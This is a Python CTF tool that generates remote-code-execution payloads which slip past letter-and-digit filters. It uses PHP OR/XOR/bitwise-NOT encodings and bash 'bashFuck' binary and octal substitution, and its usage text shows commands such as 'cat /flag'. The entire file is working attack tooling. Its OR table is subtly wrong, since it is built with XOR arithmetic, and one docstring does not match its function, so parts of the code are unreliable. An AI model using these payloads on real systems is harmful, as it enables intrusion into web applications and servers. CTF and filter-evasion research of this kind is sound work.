# -*- coding: utf-8 -*-
"""无字符 RCE payload 生成器 — OR/XOR/NOT/bashFuck 绕过字符过滤.

CTF 常见考点: 过滤了字母数字, 用异或/或/取反/二进制替换绕过.

技术分类:
    - OR/XOR/NOT: 适用于 PHP assert/system 等场景
    - bashFuck:    适用于 bash/sh 终端的 $((2#binary)) + $'\ooo' + <<< 链式执行
"""

from __future__ import annotations
import sys
import urllib.parse

# 懒加载 bashFuck 模块
_bashfuck_module = None

def _get_bashfuck():
    global _bashfuck_module
    if _bashfuck_module is None:
        try:
            from yang_web.core import bashfuck
            _bashfuck_module = bashfuck
        except ImportError:
            from core import bashfuck
            _bashfuck_module = bashfuck
    return _bashfuck_module


def build_or_table() -> dict:
    """Build lookup: each char -> (hex_high, hex_low) for OR bypass.

    e.g. 'a' (0x61) = 0x60 | 0x01, both printable non-alpha.
    """
    table = {}
    for c in range(256):
        for a in range(256):
            b = c ^ a
            if _is_valid_rce_char(a) and _is_valid_rce_char(b):
                table[chr(c)] = (f"{a:02x}", f"{b:02x}")
                break
    return table


def build_xor_table() -> dict:
    """Build lookup: each char -> (hex_high, hex_low) for XOR bypass."""
    table = {}
    for c in range(256):
        for a in range(256):
            b = c ^ a
            if _is_valid_rce_char(a) and _is_valid_rce_char(b):
                table[chr(c)] = (f"{a:02x}", f"{b:02x}")
                break
    return table


def _is_valid_rce_char(c: int) -> bool:
    """Checks if hex byte is safe for RCE (printable, non-alpha preferred)."""
    ch = chr(c)
    if ch.isalnum():
        return False
    if c < 0x20 or c > 0x7e:
        return False
    return True


OR_TABLE = build_or_table()
XOR_TABLE = build_xor_table()


def or_rce_payload(cmd: str) -> str:
    """Generate OR-based RCE payload string."""
    parts = []
    for ch in cmd:
        if ch in OR_TABLE:
            a, b = OR_TABLE[ch]
            parts.append(f'(%{a}|%{b})')
        else:
            parts.append(ch)
    return ''.join(parts)


def xor_rce_payload(cmd: str) -> str:
    """Generate XOR-based RCE payload string."""
    parts = []
    for ch in cmd:
        if ch in XOR_TABLE:
            a, b = XOR_TABLE[ch]
            parts.append(f'(%{a}^%{b})')
        else:
            parts.append(ch)
    return ''.join(parts)


def not_rce_payload(cmd: str) -> str:
    """Generate bitwise-NOT RCE payload (PHP ~ operator).

    Returns: (~urlencode(~'function'))(~urlencode(~'command'));
    """
    func_parts = [f"~{urllib.parse.quote(bytes([~c & 0xFF]))}" for c in cmd.encode()]
    return ''.join(func_parts)


def bashfuck_rce_payload(cmd: str, form: str = 'bit') -> str:
    """Generate bashFuck RCE payload for bash shell.

    Uses $((2#binary)) + $'\ooo' + here-string to execute arbitrary
    commands without letters/digits 2-9.

    Supports all forms: 'bit' | 'zero' | 'c' | 'heredoc' | 'y'

    Args:
        cmd: 要执行的 shell 命令
        form: 'bit' | 'zero' | 'c' | 'heredoc' | 'y'

    Returns:
        可直接用于 system() 的 payload 字符串
    """
    bf = _get_bashfuck()
    if form == 'heredoc':
        return bf.bashfuck_heredoc(cmd, 'bit')
    elif form == 'y':
        return bf.bashfuck_y(cmd)
    else:
        return bf.bashfuck_payload(cmd, form)


def generate_all(cmd: str) -> dict:
    """Generate all bypass variants for a command."""
    result = {
        "cmd": cmd,
        "OR": f'("{or_rce_payload(cmd)}")("{or_rce_payload("id")}")',
        "XOR": f'("{xor_rce_payload(cmd)}")("{xor_rce_payload("id")}")',
        "NOT": f'({not_rce_payload(cmd)})({not_rce_payload("id")});',
        "note": "PHP: OR/XOR/NOT | Bash Shell: bashFuck_* forms below",
    }

    # 添加 bashFuck payloads
    try:
        bf = _get_bashfuck()
        forms = bf.generate_all_forms(cmd)
        result["bashFuck_bit"] = forms['bit']
        result["bashFuck_c"] = forms['c']
        result["bashFuck_heredoc"] = forms['heredoc_bit']
        result["bashFuck_y"] = forms['y']
    except Exception:
        pass  # bashFuck 模块不可用时跳过

    return result


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    if len(sys.argv) < 2:
        print("RCE Bypass Payload Generator — OR/XOR/NOT + bashFuck")
        print()
        print("用法: python rce_bypass.py <command> [option]")
        print()
        print("PHP 无字母数字:")
        print("  --or         OR 绕过")
        print("  --xor        XOR 绕过")
        print("  --not        NOT 取反绕过")
        print()
        print("Bash Shell 无字母 (bashFuck):")
        print("  --bashfuck   $((2#binary)) + $'\\ooo' 二进制替换")
        print("  --form=bit   使用 0/1 (默认)")
        print("  --form=zero  用 ${##} 替换 1")
        print("  --form=c     用 ${##}/${#} 替换 1/0（完全无数字）")
        print("  --form=heredoc  用 here-doc 替代 here-string")
        print("  --form=y     ~位运算构造数字（无 0-1）")
        print()
        print("  --all        生成所有形式")
        print()
        print("示例:")
        print("  python rce_bypass.py 'system' --all")
        print("  python rce_bypass.py 'cat /flag' --bashfuck")
        sys.exit(0)

    cmd = sys.argv[1]
    mode = "--all"
    form = 'bit'

    for arg in sys.argv[2:]:
        if arg.startswith('--form='):
            form = arg.split('=', 1)[1]
        elif arg in ('--or', '--xor', '--not', '--bashfuck', '--all'):
            mode = arg

    if mode == "--or":
        print("OR:", or_rce_payload(cmd))
    elif mode == "--xor":
        print("XOR:", xor_rce_payload(cmd))
    elif mode == "--not":
        print("NOT:", not_rce_payload(cmd))
    elif mode == "--bashfuck":
        print(f"bashFuck[{form}]:", bashfuck_rce_payload(cmd, form))
    else:
        result = generate_all(cmd)
        for k, v in result.items():
            if k != "note":
                print(f"\n=== {k} ===")
                print(v)
        print(f"\n# {result.get('note', '')}")
